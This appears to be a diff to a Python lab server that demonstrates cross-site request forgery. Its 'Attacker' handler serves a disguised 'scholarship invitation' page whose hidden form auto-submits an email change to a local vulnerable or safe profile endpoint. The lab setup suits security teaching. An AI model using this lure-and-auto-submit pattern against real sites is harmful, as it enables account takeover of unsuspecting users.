@@ -196,9 +196,11 @@ class Handler(BaseHTTPRequestHandler):
 class Attacker(BaseHTTPRequestHandler):
     def do_GET(self):
         mode = 'safe' if 'safe' in self.path else 'vulnerable'
-        # 127.0.0.1 and localhost are different sites, as well as different origins.
+        # localhost:8001 is external to localhost:8000 (different origin).
+        # Using the same site makes the demo independent of cookie grace periods.
         target = f'http://localhost:8000/{mode}/profile'
-        body = f'''<!doctype html><html><head><title>External scholarship page</title></head><body><h1>Scholarship invitation</h1><p>This external page submits a forged email update to {html.escape(target)}.</p><form id="attack" method="post" action="{target}"><input type="hidden" name="email" value="attacker@lab.invalid"><button>Continue</button></form><script>document.getElementById('attack').submit()</script></body></html>'''.encode()
+        auto_submit = '' if 'manual=1' in self.path else "<script>document.getElementById('attack').submit()</script>"
+        body = f'''<!doctype html><html><head><title>External scholarship page</title></head><body><h1>Scholarship invitation</h1><p>This external page submits a forged email update to {html.escape(target)}.</p><form id="attack" method="post" action="{target}"><input type="hidden" name="email" value="attacker@lab.invalid"><button>Continue</button></form>{auto_submit}</body></html>'''.encode()
         self.send_response(200)
         self.send_header('Content-Type', 'text/html')
         self.send_header('Content-Length', str(len(body)))
@@ -212,7 +214,7 @@ if __name__ == '__main__':
     parser.add_argument('--attacker', action='store_true', help='Serve the external CSRF page on port 8001')
     args = parser.parse_args()
     if args.attacker:
-        print('External CSRF page: http://127.0.0.1:8001/vulnerable (or /safe)', flush=True)
+        print('External CSRF page: http://localhost:8001/vulnerable (or /safe)', flush=True)
         ThreadingHTTPServer(('127.0.0.1', 8001), Attacker).serve_forever()
     else:
         initialize(args.reset)
